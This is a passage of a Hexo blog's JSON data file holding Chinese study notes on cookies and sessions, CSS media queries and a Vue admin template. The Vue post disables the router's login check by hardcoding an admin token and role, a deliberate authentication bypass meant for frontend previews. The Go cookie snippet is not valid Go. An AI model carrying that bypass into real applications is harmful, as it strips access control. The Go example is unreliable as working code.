title=\"一、Session和Cookie简介\"></a>一、Session和Cookie简介</h2><h3 id=\"1-简介\"><a href=\"#1-简介\" class=\"headerlink\" title=\"1.简介\"></a>1.简介</h3><blockquote>\n<p>Cookie的出现是因为http是无状态协议，服务器记不住访问者，刷新一次页面可能就需要输入账号密码重新登录；</p>\n<p>cookie作用就是让服务器认识你；</p>\n</blockquote>\n<ul>\n<li>cookie可以认为是一个变量，形如name=value,存储在浏览器；</li>\n<li>一个session可以理解为一个数据结构，多数情况是<code>映射</code>，存储在服务器上；</li>\n</ul>\n<blockquote>\n<p>cookie可以在服务器通过http的SetCookie字段设置Cookie；</p>\n</blockquote>\n<figure class=\"highlight go\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs go\"><span class=\"hljs-function\"><span class=\"hljs-keyword\">func</span> <span class=\"hljs-title\">cookie</span><span class=\"hljs-params\">(w http.ResponseWriter, r *http.Request)</span></span>&#123;<br>    http.SetCookie(w,&amp;http.Cookie)&#123;<br>        Name:<span class=\"hljs-string\">&#x27;Martin&#x27;</span>,<br>        Value:<span class=\"hljs-string\">&#x27;128&#x27;</span><br>    &#125;<br>    <br>      http.SetCookie(w,&amp;http.Cookie)&#123;<br>        Name:<span class=\"hljs-string\">&#x27;Jacy&#x27;</span>,<br>        Value:<span class=\"hljs-string\">&#x27;129&#x27;</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<blockquote>\n<p>当浏览器访问对应网址时，通过浏览器的开发者工具查看此次HTTP通信的喜姐，可以看见服务器的回应发出来两次SetCookie命令；</p>\n<p>此后，浏览器请求中的Cookie都会带上这两个字段；</p>\n</blockquote>\n<h3 id=\"2-cookie的问题\"><a href=\"#2-cookie的问题\" class=\"headerlink\" title=\"2. cookie的问题\"></a>2. cookie的问题</h3><p>cookie字段存储在HTTP Header中，如果cookie的信息越来越多，会消耗更多的带宽；</p>\n<h3 id=\"3-session-cookie\"><a href=\"#3-session-cookie\" class=\"headerlink\" title=\"3. session + cookie\"></a>3. session + cookie</h3><ul>\n<li>一个cookie存储一个变量 sessionID=’123456’;</li>\n<li>仅仅将一个cookie传递给服务器，服务器通过ID查询对应的session，这个session是一个数据结构，存储了各种用户的信息，有效解决了追踪用户的问题。</li>\n<li>session是一个数据结构，由网站的开发者设计，可以承载各种数据；</li>\n<li>由于存储在服务器，所以session会有过期时间，一般是定期删除过期的session；</li>\n</ul>\n<h2 id=\"二、Session的实现\"><a href=\"#二、Session的实现\" class=\"headerlink\" title=\"二、Session的实现\"></a>二、Session的实现</h2><h3 id=\"1-实现\"><a href=\"#1-实现\" class=\"headerlink\" title=\"1.实现\"></a>1.实现</h3><ul>\n<li>Manager</li>\n<li>Provider</li>\n<li>Session</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/04/06/d80d75f3d72fd150.png\"></p>\n<ol>\n<li>浏览器通过HTTP协议向服务器请求资源，对应路径上有个Handler函数接受请求，解析HTTPheader中的cookie，得到SessionID，发送给Manager；</li>\n<li>Manager充当session管理器的角色，主要存储一些配置信息，比如session存活时间，cookie的名字等；所有的session存在Manager内部的Provider中，Manager会把sessionID传递给Provider；</li>\n<li>Provider是一个容器，散列表，将sessionID和session一一对应，收到Manager的sid后，查询session并返回；</li>\n<li>Handler根据session中的信息，进行处理，返回对应的HTML信息；</li>\n</ol>\n<h3 id=\"2-为什么要划分Manager、Provider、Session\"><a href=\"#2-为什么要划分Manager、Provider、Session\" class=\"headerlink\" title=\"2.为什么要划分Manager、Provider、Session\"></a>2.为什么要划分Manager、Provider、Session</h3><ul>\n<li>session结构可能不止一个哈希表，还存储辅助数据等；</li>\n<li>session可能有不同的存储方式：比如村粗缓存数据库redis或者存入Mysql；因此session结构提供一层抽象，屏蔽不同存储方式的差异；</li>\n<li>Provider内部会很复杂，需要适应不同的算法比如LRU缓存淘汰算法，来存储session；</li>\n<li> Manager 主要就是⼀个参数集合，⽐如 session 的存活时间，清理过期 session 的策略，以及 session 的可⽤存储⽅式。 Manager 屏蔽了操作的具体 细节，我们可以通过 Manager 灵活地配置 session 机制。</li>\n</ul>\n"},{"_content":"# css实现响应式布局\n\n### 1.响应式布局\n\n> 响应式布局指同一页面在不同屏幕尺寸下有不同的布局；\n>\n> 传统方式是PC端开发一套，手机端开发一套；\n>\n> 使用响应式布局只需要开发一套就够了；\n\n- 检测视口分辨率，针对不同客户端来做代码处理，展现不同的布局和内容；\n- css3媒体查询可以让我们针对不同的媒体类型定义不同的样式；\n- 重置浏览器窗口大小的过程，页面也会更具浏览器的宽度和高度重新渲染页面；\n\n### 2.响应式实现方式\n\n- 媒体查询\n- 流体布局\n- 弹性布局\n- JS、Jquery来进行判断；\n- Bootstrap第三方框架；\n\n### 3.媒体查询\n\n- CSS3新语法；\n- 使用@media查询可以针对不同的媒体类型定义不同的样式；\n- @media可以针对不同的屏幕尺寸设置不同的样式；\n- @media才能够实现页面响应式布局；\n\n```css\n@media[not|only] type [and][expr] (media feture){\n    rules;\n}\n```\n\n#### 参数说明：\n\n- type媒体类型：all、screen；\n- media feature :witdth (浏览器窗口尺寸，可加min\\max) device-width (设备的参数尺寸，可加min、max)；\n- min-width:最小宽度，在媒体查询中，宽度大于或者等于最小宽度是，触发其css样式；\n- max-width:最大宽度，在媒体查询中，宽度小于或等于最大宽度，触发；\n\n注：\n1.一般都是先实现PC端页面，然后再去做其他设备的兼容（把媒体查询写在默认样式之后）\n2.设置宽度时，最好不要写死(px)，而是用%单位参照父元素的大小\n\n### 4. 媒体查询方式\n\n- 直接在css文件使用\n\n```css\n@media type and (A) and (b) {\n    \trules;\n}\n```\n\n- 使用import导入\n\n```css\n/*设备宽度小于980px*/\n@import url('css/media.css') all and (max-width:980px);\n```\n\n- 使用link链接\n\n```html\n<link rel=\"stylesheet\" href=\"css/media.css\" media=\"all and (max-width:980px)\">\n```\n\n注：媒体查询的优先级与普通 CSS 完全相同，因此当使用媒体查询时，一定要将媒\n体查询的样式放在默认样式之后，否则媒体查询会被默认样式覆盖，也就无法针对不同设备\n进行变化;\n\n### 5.补充知识：像素单位\n\n- px 像素相对长度，相对于屏幕分辨率而言；\n- em 如果自身有font-size，em相对于自己的font-size，如果没有，则相对于父元素的font-size，任何浏览器的默认字体大小都是16px，所以1em=16px;\n- % 相对于父元素的宽度大小；\n- rem 相对于根元素（html)的字体大小);\n- vw 视口的最大宽度， 1vw=视口宽度的百分之一；\n- vh 视口的最大高度， 1vh=视口高度的百分之一；\n\n\n\n\n\n\n\n\n\n\n\n","source":"_posts/CSS实现响应式布局.md","raw":"# css实现响应式布局\n\n### 1.响应式布局\n\n> 响应式布局指同一页面在不同屏幕尺寸下有不同的布局；\n>\n> 传统方式是PC端开发一套，手机端开发一套；\n>\n> 使用响应式布局只需要开发一套就够了；\n\n- 检测视口分辨率，针对不同客户端来做代码处理，展现不同的布局和内容；\n- css3媒体查询可以让我们针对不同的媒体类型定义不同的样式；\n- 重置浏览器窗口大小的过程，页面也会更具浏览器的宽度和高度重新渲染页面；\n\n### 2.响应式实现方式\n\n- 媒体查询\n- 流体布局\n- 弹性布局\n- JS、Jquery来进行判断；\n- Bootstrap第三方框架；\n\n### 3.媒体查询\n\n- CSS3新语法；\n- 使用@media查询可以针对不同的媒体类型定义不同的样式；\n- @media可以针对不同的屏幕尺寸设置不同的样式；\n- @media才能够实现页面响应式布局；\n\n```css\n@media[not|only] type [and][expr] (media feture){\n    rules;\n}\n```\n\n#### 参数说明：\n\n- type媒体类型：all、screen；\n- media feature :witdth (浏览器窗口尺寸，可加min\\max) device-width (设备的参数尺寸，可加min、max)；\n- min-width:最小宽度，在媒体查询中，宽度大于或者等于最小宽度是，触发其css样式；\n- max-width:最大宽度，在媒体查询中，宽度小于或等于最大宽度，触发；\n\n注：\n1.一般都是先实现PC端页面，然后再去做其他设备的兼容（把媒体查询写在默认样式之后）\n2.设置宽度时，最好不要写死(px)，而是用%单位参照父元素的大小\n\n### 4. 媒体查询方式\n\n- 直接在css文件使用\n\n```css\n@media type and (A) and (b) {\n    \trules;\n}\n```\n\n- 使用import导入\n\n```css\n/*设备宽度小于980px*/\n@import url('css/media.css') all and (max-width:980px);\n```\n\n- 使用link链接\n\n```html\n<link rel=\"stylesheet\" href=\"css/media.css\" media=\"all and (max-width:980px)\">\n```\n\n注：媒体查询的优先级与普通 CSS 完全相同，因此当使用媒体查询时，一定要将媒\n体查询的样式放在默认样式之后，否则媒体查询会被默认样式覆盖，也就无法针对不同设备\n进行变化;\n\n### 5.补充知识：像素单位\n\n- px 像素相对长度，相对于屏幕分辨率而言；\n- em 如果自身有font-size，em相对于自己的font-size，如果没有，则相对于父元素的font-size，任何浏览器的默认字体大小都是16px，所以1em=16px;\n- % 相对于父元素的宽度大小；\n- rem 相对于根元素（html)的字体大小);\n- vw 视口的最大宽度， 1vw=视口宽度的百分之一；\n- vh 视口的最大高度， 1vh=视口高度的百分之一；\n\n\n\n\n\n\n\n\n\n\n\n","slug":"CSS实现响应式布局","published":1,"date":"2023-04-06T12:51:38.239Z","updated":"2023-04-06T13:44:24.362Z","title":"","comments":1,"layout":"post","photos":[],"link":"","_id":"cljf1dojm0000ak9c2ge46two","content":"<h1 id=\"css实现响应式布局\"><a href=\"#css实现响应式布局\" class=\"headerlink\" title=\"css实现响应式布局\"></a>css实现响应式布局</h1><h3 id=\"1-响应式布局\"><a href=\"#1-响应式布局\" class=\"headerlink\" title=\"1.响应式布局\"></a>1.响应式布局</h3><blockquote>\n<p>响应式布局指同一页面在不同屏幕尺寸下有不同的布局；</p>\n<p>传统方式是PC端开发一套，手机端开发一套；</p>\n<p>使用响应式布局只需要开发一套就够了；</p>\n</blockquote>\n<ul>\n<li>检测视口分辨率，针对不同客户端来做代码处理，展现不同的布局和内容；</li>\n<li>css3媒体查询可以让我们针对不同的媒体类型定义不同的样式；</li>\n<li>重置浏览器窗口大小的过程，页面也会更具浏览器的宽度和高度重新渲染页面；</li>\n</ul>\n<h3 id=\"2-响应式实现方式\"><a href=\"#2-响应式实现方式\" class=\"headerlink\" title=\"2.响应式实现方式\"></a>2.响应式实现方式</h3><ul>\n<li>媒体查询</li>\n<li>流体布局</li>\n<li>弹性布局</li>\n<li>JS、Jquery来进行判断；</li>\n<li>Bootstrap第三方框架；</li>\n</ul>\n<h3 id=\"3-媒体查询\"><a href=\"#3-媒体查询\" class=\"headerlink\" title=\"3.媒体查询\"></a>3.媒体查询</h3><ul>\n<li>CSS3新语法；</li>\n<li>使用@media查询可以针对不同的媒体类型定义不同的样式；</li>\n<li>@media可以针对不同的屏幕尺寸设置不同的样式；</li>\n<li>@media才能够实现页面响应式布局；</li>\n</ul>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs css\"><span class=\"hljs-keyword\">@media</span>[not|only] type [<span class=\"hljs-keyword\">and</span>][expr] (media feture)&#123;<br>    rules;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<h4 id=\"参数说明：\"><a href=\"#参数说明：\" class=\"headerlink\" title=\"参数说明：\"></a>参数说明：</h4><ul>\n<li>type媒体类型：all、screen；</li>\n<li>media feature :witdth (浏览器窗口尺寸，可加min\\max) device-width (设备的参数尺寸，可加min、max)；</li>\n<li>min-width:最小宽度，在媒体查询中，宽度大于或者等于最小宽度是，触发其css样式；</li>\n<li>max-width:最大宽度，在媒体查询中，宽度小于或等于最大宽度，触发；</li>\n</ul>\n<p>注：<br>1.一般都是先实现PC端页面，然后再去做其他设备的兼容（把媒体查询写在默认样式之后）<br>2.设置宽度时，最好不要写死(px)，而是用%单位参照父元素的大小</p>\n<h3 id=\"4-媒体查询方式\"><a href=\"#4-媒体查询方式\" class=\"headerlink\" title=\"4. 媒体查询方式\"></a>4. 媒体查询方式</h3><ul>\n<li>直接在css文件使用</li>\n</ul>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs css\"><span class=\"hljs-keyword\">@media</span> type <span class=\"hljs-keyword\">and</span> (A) <span class=\"hljs-keyword\">and</span> (b) &#123;<br>    \trules;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>使用import导入</li>\n</ul>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs css\"><span class=\"hljs-comment\">/*设备宽度小于980px*/</span><br><span class=\"hljs-keyword\">@import</span> url(<span class=\"hljs-string\">&#x27;css/media.css&#x27;</span>) all <span class=\"hljs-keyword\">and</span> (<span class=\"hljs-attribute\">max-width</span>:<span class=\"hljs-number\">980px</span>);<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>使用link链接</li>\n</ul>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">&quot;stylesheet&quot;</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">&quot;css/media.css&quot;</span> <span class=\"hljs-attr\">media</span>=<span class=\"hljs-string\">&quot;all and (max-width:980px)&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>注：媒体查询的优先级与普通 CSS 完全相同，因此当使用媒体查询时，一定要将媒<br>体查询的样式放在默认样式之后，否则媒体查询会被默认样式覆盖，也就无法针对不同设备<br>进行变化;</p>\n<h3 id=\"5-补充知识：像素单位\"><a href=\"#5-补充知识：像素单位\" class=\"headerlink\" title=\"5.补充知识：像素单位\"></a>5.补充知识：像素单位</h3><ul>\n<li>px 像素相对长度，相对于屏幕分辨率而言；</li>\n<li>em 如果自身有font-size，em相对于自己的font-size，如果没有，则相对于父元素的font-size，任何浏览器的默认字体大小都是16px，所以1em=16px;</li>\n<li>% 相对于父元素的宽度大小；</li>\n<li>rem 相对于根元素（html)的字体大小);</li>\n<li>vw 视口的最大宽度， 1vw=视口宽度的百分之一；</li>\n<li>vh 视口的最大高度， 1vh=视口高度的百分之一；</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"css实现响应式布局\"><a href=\"#css实现响应式布局\" class=\"headerlink\" title=\"css实现响应式布局\"></a>css实现响应式布局</h1><h3 id=\"1-响应式布局\"><a href=\"#1-响应式布局\" class=\"headerlink\" title=\"1.响应式布局\"></a>1.响应式布局</h3><blockquote>\n<p>响应式布局指同一页面在不同屏幕尺寸下有不同的布局；</p>\n<p>传统方式是PC端开发一套，手机端开发一套；</p>\n<p>使用响应式布局只需要开发一套就够了；</p>\n</blockquote>\n<ul>\n<li>检测视口分辨率，针对不同客户端来做代码处理，展现不同的布局和内容；</li>\n<li>css3媒体查询可以让我们针对不同的媒体类型定义不同的样式；</li>\n<li>重置浏览器窗口大小的过程，页面也会更具浏览器的宽度和高度重新渲染页面；</li>\n</ul>\n<h3 id=\"2-响应式实现方式\"><a href=\"#2-响应式实现方式\" class=\"headerlink\" title=\"2.响应式实现方式\"></a>2.响应式实现方式</h3><ul>\n<li>媒体查询</li>\n<li>流体布局</li>\n<li>弹性布局</li>\n<li>JS、Jquery来进行判断；</li>\n<li>Bootstrap第三方框架；</li>\n</ul>\n<h3 id=\"3-媒体查询\"><a href=\"#3-媒体查询\" class=\"headerlink\" title=\"3.媒体查询\"></a>3.媒体查询</h3><ul>\n<li>CSS3新语法；</li>\n<li>使用@media查询可以针对不同的媒体类型定义不同的样式；</li>\n<li>@media可以针对不同的屏幕尺寸设置不同的样式；</li>\n<li>@media才能够实现页面响应式布局；</li>\n</ul>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs css\"><span class=\"hljs-keyword\">@media</span>[not|only] type [<span class=\"hljs-keyword\">and</span>][expr] (media feture)&#123;<br>    rules;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<h4 id=\"参数说明：\"><a href=\"#参数说明：\" class=\"headerlink\" title=\"参数说明：\"></a>参数说明：</h4><ul>\n<li>type媒体类型：all、screen；</li>\n<li>media feature :witdth (浏览器窗口尺寸，可加min\\max) device-width (设备的参数尺寸，可加min、max)；</li>\n<li>min-width:最小宽度，在媒体查询中，宽度大于或者等于最小宽度是，触发其css样式；</li>\n<li>max-width:最大宽度，在媒体查询中，宽度小于或等于最大宽度，触发；</li>\n</ul>\n<p>注：<br>1.一般都是先实现PC端页面，然后再去做其他设备的兼容（把媒体查询写在默认样式之后）<br>2.设置宽度时，最好不要写死(px)，而是用%单位参照父元素的大小</p>\n<h3 id=\"4-媒体查询方式\"><a href=\"#4-媒体查询方式\" class=\"headerlink\" title=\"4. 媒体查询方式\"></a>4. 媒体查询方式</h3><ul>\n<li>直接在css文件使用</li>\n</ul>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs css\"><span class=\"hljs-keyword\">@media</span> type <span class=\"hljs-keyword\">and</span> (A) <span class=\"hljs-keyword\">and</span> (b) &#123;<br>    \trules;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>使用import导入</li>\n</ul>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs css\"><span class=\"hljs-comment\">/*设备宽度小于980px*/</span><br><span class=\"hljs-keyword\">@import</span> url(<span class=\"hljs-string\">&#x27;css/media.css&#x27;</span>) all <span class=\"hljs-keyword\">and</span> (<span class=\"hljs-attribute\">max-width</span>:<span class=\"hljs-number\">980px</span>);<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>使用link链接</li>\n</ul>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">&quot;stylesheet&quot;</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">&quot;css/media.css&quot;</span> <span class=\"hljs-attr\">media</span>=<span class=\"hljs-string\">&quot;all and (max-width:980px)&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>注：媒体查询的优先级与普通 CSS 完全相同，因此当使用媒体查询时，一定要将媒<br>体查询的样式放在默认样式之后，否则媒体查询会被默认样式覆盖，也就无法针对不同设备<br>进行变化;</p>\n<h3 id=\"5-补充知识：像素单位\"><a href=\"#5-补充知识：像素单位\" class=\"headerlink\" title=\"5.补充知识：像素单位\"></a>5.补充知识：像素单位</h3><ul>\n<li>px 像素相对长度，相对于屏幕分辨率而言；</li>\n<li>em 如果自身有font-size，em相对于自己的font-size，如果没有，则相对于父元素的font-size，任何浏览器的默认字体大小都是16px，所以1em=16px;</li>\n<li>% 相对于父元素的宽度大小；</li>\n<li>rem 相对于根元素（html)的字体大小);</li>\n<li>vw 视口的最大宽度， 1vw=视口宽度的百分之一；</li>\n<li>vh 视口的最大高度， 1vh=视口高度的百分之一；</li>\n</ul>\n"},{"title":"TS 基础","date":"2023-06-26T13:33:45.000Z","mp3":null,"cover":"img/bg3.jpg","_content":"\n# TS 基础\n","source":"_posts/TS基础.md","raw":"---\ntitle: TS 基础\ndate: 2023-06-26 21:33:45\ncategories:\n  - 前端\ntags:\n  - VUE\n  - 笔记\n  - TS\nmp3:\ncover: img/bg3.jpg\n---\n\n# TS 基础\n","slug":"TS基础","published":1,"updated":"2023-06-28T01:28:21.945Z","_id":"cljf1dojp0001ak9c795camph","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"TS-基础\"><a href=\"#TS-基础\" class=\"headerlink\" title=\"TS 基础\"></a>TS 基础</h1>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"TS-基础\"><a href=\"#TS-基础\" class=\"headerlink\" title=\"TS 基础\"></a>TS 基础</h1>"},{"title":"Vue登录页面跳过","date":"2023-06-25T13:33:45.000Z","mp3":null,"cover":"img/bg3.jpg","_content":"\n# Vue 登录页面跳过\n\n### 1.业务需求\n\n- 后端暂时无法提供接口\n- 需要查看前端页面效果\n\n### 2.方法\n\n```js\n/*\n * @Author: Aruver\n * @Date: 2022-10-08 09:45:03\n * @LastEditors: Aruver\n * @qq: 37919926\n */\nimport router from './router'\nimport store from './store'\nimport { Message } from 'element-ui'\nimport NProgress from 'nprogress' // progress bar\nimport 'nprogress/nprogress.css' // progress bar style\nimport { getToken } from '@/utils/auth' // get token from cookie\nimport getPageTitle from '@/utils/get-page-title'\n\nNProgress.configure({ showSpinner: false }) // NProgress Configuration\n\nconst whiteList = ['/login'] // no redirect whitelist\n\nrouter.beforeEach(async (to, from, next) => {\n  // start progress bar\n  NProgress.start()\n\n  // set page title\n  document.title = getPageTitle(to.meta.title)\n\n  // determine whether the user has logged in\n  // const hasToken = getToken()\n\n  // if (hasToken) {\n  //   if (to.path === '/login') {\n  //     // if is logged in, redirect to the home page\n  //     next({ path: '/' })\n  //     NProgress.done()\n  //   } else {\n  //     const hasGetUserInfo = store.getters.name\n  //     if (hasGetUserInfo) {\n  //       next()\n  //     } else {\n  //       try {\n  //         // get user info\n  //         // await store.dispatch('user/getInfo')\n\n  //         next()\n  //       } catch (error) {\n  //         // remove token and go to login page to re-login\n  //         await store.dispatch('user/resetToken')\n  //         Message.error(error || 'Has Error')\n  //         next(`/login?redirect=${to.path}`)\n  //         NProgress.done()\n  //       }\n  //     }\n  //   }\n  // } else {\n  //   /* has no token*/\n\n  //   if (whiteList.indexOf(to.path) !== -1) {\n  //     // in the free login whitelist, go directly\n  //     next()\n  //   } else {\n  //     // other pages that do not have permission to access are redirected to the login page.\n  //     next(`/login?redirect=${to.path}`)\n  //     NProgress.done()\n  //   }\n  // }\n\n  //跳过登录，设置默认的token，然后输入其中一个路由进入页面\n  const hasToken = 'admin-token'\n  const role = 'admin'\n  if (hasToken) {\n    next()\n    const accessRoutes = await store.dispatch('permission/generateRoutes', role)\n    // dynamically add accessible routes\n    router.addRoutes(accessRoutes)\n  }\n})\n\nrouter.afterEach(() => {\n  // finish progress bar\n  NProgress.done()\n})\n```\n","source":"_posts/Vue-Admin-Template跳过登陆页面.md","raw":"---\ntitle: Vue登录页面跳过\ndate: 2023-06-25 21:33:45\ncategories:\n  - 前端\ntags:\n  - VUE\n  - 笔记\n  - 项目问题\nmp3:\ncover: img/bg3.jpg\n---\n\n# Vue 登录页面跳过\n\n### 1.业务需求\n\n- 后端暂时无法提供接口\n- 需要查看前端页面效果\n\n### 2.方法\n\n```js\n/*\n * @Author: Aruver\n * @Date: 2022-10-08 09:45:03\n * @LastEditors: Aruver\n * @qq: 37919926\n */\nimport router from './router'\nimport store from './store'\nimport { Message } from 'element-ui'\nimport NProgress from 'nprogress' // progress bar\nimport 'nprogress/nprogress.css' // progress bar style\nimport { getToken } from '@/utils/auth' // get token from cookie\nimport getPageTitle from '@/utils/get-page-title'\n\nNProgress.configure({ showSpinner: false }) // NProgress Configuration\n\nconst whiteList = ['/login'] // no redirect whitelist\n\nrouter.beforeEach(async (to, from, next) => {\n  // start progress bar\n  NProgress.start()\n\n  // set page title\n  document.title = getPageTitle(to.meta.title)\n\n  // determine whether the user has logged in\n  // const hasToken = getToken()\n\n  // if (hasToken) {\n  //   if (to.path === '/login') {\n  //     // if is logged in, redirect to the home page\n  //     next({ path: '/' })\n  //     NProgress.done()\n  //   } else {\n  //     const hasGetUserInfo = store.getters.name\n  //     if (hasGetUserInfo) {\n  //       next()\n  //     } else {\n  //       try {\n  //         // get user info\n  //         // await store.dispatch('user/getInfo')\n\n  //         next()\n  //       } catch (error) {\n  //         // remove token and go to login page to re-login\n  //         await store.dispatch('user/resetToken')\n  //         Message.error(error || 'Has Error')\n  //         next(`/login?redirect=${to.path}`)\n  //         NProgress.done()\n  //       }\n  //     }\n  //   }\n  // } else {\n  //   /* has no token*/\n\n  //   if (whiteList.indexOf(to.path) !== -1) {\n  //     // in the free login whitelist, go directly\n  //     next()\n  //   } else {\n  //     // other pages that do not have permission to access are redirected to the login page.\n  //     next(`/login?redirect=${to.path}`)\n  //     NProgress.done()\n  //   }\n  // }\n\n  //跳过登录，设置默认的token，然后输入其中一个路由进入页面\n  const hasToken = 'admin-token'\n  const role = 'admin'\n  if (hasToken) {\n    next()\n    const accessRoutes = await store.dispatch('permission/generateRoutes', role)\n    // dynamically add accessible routes\n    router.addRoutes(accessRoutes)\n  }\n})\n\nrouter.afterEach(() => {\n  // finish progress bar\n  NProgress.done()\n})\n```\n","slug":"Vue-Admin-Template跳过登陆页面","published":1,"updated":"2023-06-28T01:25:58.100Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cljf1dojs0002ak9chic5e6h5","content":"<h1 id=\"Vue-登录页面跳过\"><a href=\"#Vue-登录页面跳过\" class=\"headerlink\" title=\"Vue 登录页面跳过\"></a>Vue 登录页面跳过</h1><h3 id=\"1-业务需求\"><a href=\"#1-业务需求\" class=\"headerlink\" title=\"1.业务需求\"></a>1.业务需求</h3><ul>\n<li>后端暂时无法提供接口</li>\n<li>需要查看前端页面效果</li>\n</ul>\n<h3 id=\"2-方法\"><a href=\"#2-方法\" class=\"headerlink\" title=\"2.方法\"></a>2.方法</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">/*</span><br><span class=\"hljs-comment\"> * @Author: Aruver</span><br><span class=\"hljs-comment\"> * @Date: 2022-10-08 09:45:03</span><br><span class=\"hljs-comment\"> * @LastEditors: Aruver</span><br><span class=\"hljs-comment\"> * @qq: 37919926</span><br><span class=\"hljs-comment\"> */</span><br><span class=\"hljs-keyword\">import</span> router <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">&#x27;./router&#x27;</span><br><span class=\"hljs-keyword\">import</span> store <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">&#x27;./store&#x27;</span><br><span class=\"hljs-keyword\">import</span> &#123; <span class=\"hljs-title class_\">Message</span> &#125; <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">&#x27;element-ui&#x27;</span><br><span class=\"hljs-keyword\">import</span> <span class=\"hljs-title class_\">NProgress</span> <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">&#x27;nprogress&#x27;</span> <span class=\"hljs-comment\">// progress bar</span><br><span class=\"hljs-keyword\">import</span> <span class=\"hljs-string\">&#x27;nprogress/nprogress.css&#x27;</span> <span class=\"hljs-comment\">// progress bar style</span><br><span class=\"hljs-keyword\">import</span> &#123; getToken &#125; <span class=\"hljs-keyword\">from</span> <span 